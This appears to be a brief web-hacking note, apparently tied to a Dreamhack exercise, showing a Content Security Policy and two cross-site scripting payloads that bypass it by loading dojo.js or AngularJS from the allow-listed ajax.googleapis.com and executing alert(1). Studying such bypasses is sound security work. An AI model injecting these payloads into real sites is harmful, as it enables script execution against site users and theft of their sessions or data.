# CSP Bypass In Web Hacking

### Scenario 1

```
default-src 'self'; img-src https://dreamhack.io; style-src 'self' 'unsafe-inline'; script-src 'nonce-{nonce}' 'unsafe-eval' https://ajax.googleapis.com; object-src 'none'
```

`https://aja.googleapis.com` is where we can exploit. Working payloads with `dojo.js` lib:

```javascript
<script
  src="https://ajax.googleapis.com/ajax/libs/dojo/1.10.4/dojo/dojo.js"
  data-dojo-config="callback:alert(1)"
></script>
```

or `angular.js` lib:

```javascript
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js"></script><html ng-app>{{ constructor.constructor("alert(1)")() }}</html>
```
